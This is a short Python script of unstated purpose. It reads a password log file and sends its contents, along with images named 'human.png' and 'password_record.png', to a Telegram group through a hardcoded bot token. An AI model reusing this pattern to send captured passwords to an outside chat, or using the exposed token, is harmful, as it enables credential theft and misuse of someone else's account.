import telegram

def bot_message():

    try:
        # Use this token to access the HTTP API:
        notify = telegram.Bot("5784714061:AAGfBAbG2Ee6Y9xSKA76vyrhB5m2h8-TWIk")
        # Read filed
        f1 = open("PassLog/Log.txt", 'r+', encoding='UTF-8')
        data1 = f1.read()
        message1 = "{}".format(data1)
        notify.send_message(chat_id="-887836864", text=message1, parse_mode='Markdown')
    except Exception as ex:
        print(ex)


def bot_photo():
    try:
        notify = telegram.Bot("5784714061:AAGfBAbG2Ee6Y9xSKA76vyrhB5m2h8-TWIk")
        notify.send_photo(chat_id="-887836864", photo=open('Image/human.png', 'rb'))
        notify.send_photo(chat_id="-887836864", photo=open('Image/password_record.png', 'rb'))
    except Exception as ex:
        print(ex)
